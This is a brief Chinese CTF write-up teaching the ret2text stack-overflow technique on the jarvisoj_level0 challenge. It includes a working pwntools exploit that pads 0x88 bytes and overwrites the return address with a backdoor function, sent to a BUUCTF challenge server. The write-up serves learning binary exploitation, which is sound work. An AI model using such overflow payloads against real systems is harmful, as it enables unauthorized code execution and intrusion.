---
title: 【PWN】ret2text
---

## 原理

ret2text就是篡改栈帧上的返回地址为程序中已有的后门函数，我们需要知道对应返回的代码的位置。
## 例题
jarvisoj_level0，可在buuctf网站中下载。首先使用checksec工具查看它开了啥保护措施，基本全关。

![1.jpg](/images/ret2text/1.jpg)

然后我们使用ida查看一下该程序，程序很简单,有明显的栈溢出漏洞和后门函数，后门函数地址就为0x40059A。

![2.jpg](/images/ret2text/2.jpg)

![3.jpg](/images/ret2text/3.jpg)

ida帮我们计算出来了buf字符串距离rbp有0x80个字节，由于rbp本身还占8个字节，所以溢出0x88个字节后将返回地址修改为后门函数的地址exp如下。

```python
 
from pwn import *

#p = process('./level0')
p = remote('node3.buuoj.cn',27644)
sys_addr = 0x40059A

payload = cyclic(0x88) + p64(sys_addr)

p.recv()
p.sendline(payload)
p.interactive()
```